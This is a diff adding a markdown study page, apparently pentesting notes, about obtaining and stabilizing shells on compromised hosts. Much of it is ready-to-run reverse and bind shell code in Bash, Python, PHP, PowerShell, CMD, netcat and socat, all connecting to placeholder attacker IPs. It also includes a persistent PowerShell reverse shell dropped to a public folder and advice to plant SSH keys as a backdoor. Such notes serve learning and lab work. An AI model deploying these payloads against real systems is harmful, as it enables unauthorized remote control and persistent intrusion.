@@ -1,0 +1,347 @@
+---
+title: Shells and Footholds
+description: Shell types, netcat, upgrades, and bind/reverse shell examples.
+---
+
+
+### Understanding Shells
+
+🕹What is a Shell - FOOTHOLD
+In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common BASH or ZSH programs in Linux are examples of shells, as are Command-Prompt and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target. In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port connection on the server which we can connect to in order to execute further commands (a bind/Forward shell).
+There are a variety of tools that can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system, such as NETCAT, SOCAT, Metasploit Modules—>multi/handler(Listens for Connections) & Msfvenom(Create Bind/Reverse Shell Payload).
+Shells can be either interactive or non-interactive.
+Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. An interactive program, requires an interactive shell in order to run.
+Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Suffice to say that interactive programs do not work in non-interactive shells. 
+
+### Shell Types: Bind and Reverse
+
+Bind shells -> When the Payload code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
+Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the above to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. 
+
+### Netcat for Shell Connections
+
+NETCAT (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. The command is designed to be a dependable back-end that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and investigation tool, since it can produce almost any kind of connection its user could need and has several built-in capabilities. Its list of features includes port scanning, transferring files, and port listening: as with any server, it can be used as a backdoor.
+    -l is used to tell netcat that this will be a listener
+    -v is used to request a verbose output
+    -n tells netcat not to resolve host names or use DNS. 
+    -p indicates that the port specification will follow.
+If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. 
+
+### Shell Upgrade Techniques
+
+#### Bash Reverse Shell Connection
+
+A.\tThe payload you've mentioned is used to create a reverse shell, which is a method for establishing a connection back to your machine from a target system. This can be particularly useful in situations(especially exploiting Webservers) where you have an unstable or non-interactive shell on the target and need a more stable and interactive environment. This setup assumes you have a listener set up on your machine at the specified IP and port (e.g., using `nc -lvp 443`) to accept the incoming connection. Once executed, the target machine will initiate a connection to your listener, giving you Partially-Interactive control over the shell. However, this type of shell might not be fully stable or fully interactive in terms of handling terminal input/output correctly, especially for programs that require full terminal capabilities (like `vi`, `top`, etc.).
+
+Here’s a breakdown of the command: ### `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`
+- bash -c: This instructs the Bash shell to read commands from the following string in form of a command line argument similar to Python -c
+This allows you to execute a sequence of commands directly from the command line without needing to write them into a script file.
+- bash -i: This initiates a new instance of Bash with the `-i` option to force it to run in interactive mode, which allows for an interactive shell session.
+- >& /dev/tcp/\{your_IP\}/443: This part redirects both stdout (standard output) and stderr (standard error) to a TCP connection to the specified IP address (`{your_IP}`) on port 443. The `/dev/tcp/host/port` is a special file used by Bash to handle TCP connections.
+- 0>&1: This redirects stdin (standard input) to the same destination as stdout. Essentially, this connects the input of the shell to the TCP stream, allowing commands to be sent remotely.
+
+####  What Happens When You Run This Command in a Reverse Shell? 
+- Direct Connection: By creating a direct TCP connection to a listening port on your machine, you bypass potential restrictions or issues with the initial shell environment.
+- Interactive Mode: Running Bash in interactive mode ensures that the shell behaves more like a normal terminal, supporting job control, aliases, and more.
+- Unified Input/Output Redirection: Redirecting stderr and stdout together to the remote connection helps ensure that all output is captured remotely, making debugging and interaction easier.
+
+
+#### Python Shell Upgrade
+
+B.\tThe command python -c 'import pty; pty.spawn("/bin/bash")' is used in the context of a reverse shell to upgrade the partial-interactive shell you have obtained on a remote system to a fully interactive shell. Here's what each part does:
+
+1. python3 -c: This part tells the system to execute the following Python code as a one-liner command. The `-c` option allows you to run a Python script in the form of a command line argument. This allows you to execute a sequence of commands directly from the command line without needing to write them into a script file
+2. import pty: This imports the Python module `pty`. The `pty` module defines operations for handling pseudo-terminal concepts, providing an interface to the pseudo-terminal devices supported by Unix (and Unix-like) systems.
+3. pty.spawn("/bin/bash"): This function spawns a new process running the executable specified—in this case, `/bin/bash`. Essentially, it starts a new bash shell session.
+
+### How It Enhances Stability and Interactivity:
+- Upgraded Interactive Shell: Normally, when you get a reverse shell, it might be limited in functionality. For example, certain interactive commands like `vi`, `top`, or even `clear` might not work properly. By using `pty.spawn("/bin/bash")`, you are essentially upgrading your shell to a fully interactive bash session that can handle these commands correctly.
+- Terminal Control: It allocates a pseudo-terminal (PTY) for the shell session, which means it behaves more like a normal terminal interface/window. This is crucial for interacting with programs that require a Terminal Environment/TTY (teletypewriter). 
+- Improved User Experience: With a PTY, the shell environment becomes more user-friendly, supporting job control, proper signal propagation, and keyboard shortcuts (like Ctrl + C to terminate processes).
+This command is particularly useful in scenarios where you have gained access through a simplistic shell that lacks full terminal capabilities. Upgrading to a fully interactive shell allows for more complex operations and a better overall experience while managing the server via a reverse shell.
+
+
+### Conclusion -> Both commands are good for chaining. Combining these two commands can be highly effective: The first command establishes the initial connection and gives you basic interactivity. The second command upgrades the shell to a fully interactive one, enhancing your ability to interact with the system. Using both in sequence provides a robust method for managing remote systems through reverse shells, especially when dealing with unstable or non-interactive environments initially.
+1. **Establish a Reverse Shell**: First, use the Bash reverse shell command to gain initial access.
+2. **Upgrade the Shell**: Once you have the reverse shell, send the Python command to upgrade to a fully interactive shell.
+#### Example Sequence
+1. Start a listener on your local machine:
+   ```bash
+   nc -lvnp 443
+   ```  
+2. Execute the reverse shell from the target machine:
+   ```bash
+   bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
+   ```
+3. Once you have the shell, upgrade it:
+   ```bash
+   python -c 'import pty; pty.spawn("/bin/bash")'
+   ```
+
+#### PowerShell Reverse Shell
+
+C.\t # PowerShell can be crafted to simulate a reverse shell, which connects back to an attacker-controlled server, allowing command execution. This is analogous to the Bash reverse shell example without the Python Part. For a proof of concept (PoC) to demonstrate an exploit on a webserver hosted in a Windows environment, directly translating the Bash and Python one-liners might not work effectively due to differences in underlying operating systems and available tools. Instead, you can use PowerShell or other native Windows functionalities to create a similar impact
+
+```powershell
+$IP = "attacker_IP"  # Replace with the IP address of the attacker's machine
+$Port = 443          # Port number on which the attacker's listener is running
+try {
+    $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
+    $stream = $client.GetStream()
+    [byte[]]$buffer = 0..65535|%{0}
+
+    # Loop to read commands from the TCP connection and execute them
+    while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
+        $command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i)
+        $output = Invoke-Expression $command 2>&1 | Out-String
+        $response = ($output + "PS " + (pwd).Path + "> ")
+        $sendBytes = ([text.encoding]::ASCII).GetBytes($response)
+        $stream.Write($sendBytes,0,$sendBytes.Length)
+        $stream.Flush()  
+    }
+    $client.Close()
+} catch {
+    Write-Output "Error: $_"
+}
+```
+
+Example Command to Create the Script Directly on the Target:
+
+```powershell
+Set-Content -Path "C:\Users\Public\revshell.ps1" -Value @"
+while ($true) {
+    try {
+        $client = New-Object System.Net.Sockets.TCPClient("YOUR_IP", YOUR_PORT);
+        $stream = $client.GetStream();
+        [byte[]]$bytes = 0..65535|%{0};
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String );
+            $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+            $stream.Write($sendbyte,0,$sendbyte.Length);
+            $stream.Flush();
+        }
+        $client.Close();
+        Start-Sleep -Seconds 10;
+    } catch {
+        Start-Sleep -Seconds 10;
+    }
+}
+"@
+```
+
+#A simple and small reverse shell. Options and help removed to save space. 
+#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well. To receive the connection from the PowerShell reverse shell, you should set up a listener on the specified IP and port on your (the attacker's) machine. You can use netcat for this purpose: nc -lvnp 443
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP", YOUR_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$sm=(New-Object Net.Sockets.TCPClient("YOUR_IP", YOUR_PORT)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+```
+
+### Shell Implementation Examples
+
+Below are Simplified code snippets for both a bind shell and a reverse shell in PHP, Python, Powershell, CMD, BASH. These snippets will focus on the core functionality needed to start a simple shell and make it interactive. Credit should be given to Metasploit Team, as i scorched through their codes to find the exact snippets that run bind and reverse shells
+Reference Location:https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/payload && https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads
+
+
+### Python Bind Shell
+```python
+import socket, subprocess, os
+
+# Set up listening socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(('0.0.0.0', 443))
+s.listen(1)
+conn, addr = s.accept()
+
+# Execute commands
+while True:
+    data = conn.recv(1024)
+    if data.decode().strip() == 'exit': break
+    proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output = proc.stdout.read() + proc.stderr.read()
+    conn.send(output)
+
+conn.close()
+```
+
+### Python Reverse Shell
+```python
+import socket, subprocess, os
+
+# Connect to attacker's server
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('{your_IP}', 443))
+
+# Execute commands
+while True:
+    data = s.recv(1024)
+    if data.decode().strip() == 'exit': break
+    proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output = proc.stdout.read() + proc.stderr.read()
+    s.send(output)
+
+s.close()
+```
+
+### PHP Bind Shell
+```php
+<?php
+$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_bind($sock, "0.0.0.0", 443);
+socket_listen($sock);
+
+$client = socket_accept($sock);
+
+// Handle incoming commands
+while(($input = socket_read($client, 1024)) !== false) {
+    if(trim($input) == 'exit') break;
+    $output = shell_exec($input);
+    socket_write($client, $output);
+}
+
+socket_close($client);
+socket_close($sock);
+?>
+```
+
+### PHP Reverse Shell
+```php
+<?php
+$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_connect($sock, '{your_IP}', 443);
+
+// Handle commands from the server
+while(($input = socket_read($sock, 1024)) !== false) {
+    if(trim($input) == 'exit') break;
+    $output = shell_exec($input);
+    socket_write($sock, $output);
+}
+
+socket_close($sock);
+?>
+```
+
+### PowerShell Bind Shell
+```powershell
+# Listen on port 443
+$listener = [System.Net.Sockets.TcpListener]443
+$listener.Start()
+$client = $listener.AcceptTcpClient()
+
+$stream = $client.GetStream()
+$writer = new-object System.IO.StreamWriter($stream)
+$reader = new-object System.IO.StreamReader($stream)
+# Execute commands
+while (($cmd = $reader.ReadLine()) -ne "exit") {
+    $output = iex $cmd 2>&1
+    $writer.WriteLine($output)
+    $writer.Flush()
+}
+
+$client.Close()
+$listener.Stop()
+```
+
+### PowerShell Reverse Shell
+```powershell
+$ip = "{your_IP}"
+$port = 443
+$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+$stream = $client.GetStream()
+$writer = new-object System.IO.StreamWriter($stream)
+$reader = new-object System.IO.StreamReader($stream)
+
+# Send commands output back to attacker
+while (($cmd = $reader.ReadLine()) -ne "exit") {
+    $output = iex $cmd 2>&1
+    $writer.WriteLine($output)
+    $writer.Flush()
+}
+$client.Close()
+```
+
+### CMD.exe Bind Shell
+```batch
+@echo off
+rem Listening on port 443
+nc -lvp 443 -e cmd.exe
+```
+### CMD.exe Reverse Shell
+```batch
+@echo off
+rem Replace {your_IP} with the IP address of the attacker's machine
+nc {your_IP} 443 -e cmd.exe
+```
+
+### Bash Bind Shell
+```bash
+# Listen on port 443
+nc -lvp 443 -e /bin/bash
+```
+### Bash Reverse Shell
+```bash
+# Replace {your_IP} with the IP address of the attacker's machine
+nc {your_IP} 443 -e /bin/bash
+```
+
+### Notes
+- **PowerShell**: Uses .NET classes to create TCP connections and execute commands.
+- **CMD.exe**: Utilizes `nc` (Netcat), a networking utility for reading from and writing to network connections using TCP or UDP. It is assumed to be installed on the system.
+- **Bash**: Also uses `nc` for creating simple TCP connections.
+- **Python**: The code uses `subprocess` to execute commands and communicate back the results.
+- **PHP**: Uses `socket` functions to create TCP connections and `shell_exec` to run commands.
+- **Customization**: Replace `{your_IP}` with your actual IP address where the server-side script is listening.
+
+
+### Socat Reverse Shell
+
+Run on the attacker’s terminal:
+
+```bash
+socat TCP-L:4444 -
+```
+
+Run on the target’s terminal:
+
+```bash
+socat TCP:<Attacker_IP>:4444 EXEC:"bash -li"
+```
+
+### Socat Bind Shell
+
+Run on the target’s terminal:
+
+```bash
+socat TCP-L:4444 EXEC:"bash -li"
+```
+
+Run on the attacker’s terminal:
+
+```bash
+socat TCP:<Target_IP>:4444 -
+```
+
+### Socat TTY Upgrade
+
+Run on the attacker’s terminal:
+
+```bash
+socat TCP-L:4444 FILE:`tty`,raw,echo=0
+```
+
+Run on the target’s terminal:
+
+```bash
+socat TCP:<Attacker_IP>:4444 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
+The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:
+pty, allocates a pseudoterminal on the target -- part of the stabilisation process
+stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
+sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
+setsid, creates the process in a new session
+sane, stabilises the terminal, attempting to "normalise" it.
+
+SSH keys are an excellent way to “upgrade” a reverse shell, assuming the user has login enabled (www-data normally does not, but regular users and root will). Leaving an SSH key in authorized_keys on a box can be a useful backdoor, and you don't need to deal with any of the issues of unstabilised reverse shells like Control-C or lack of tab completion.
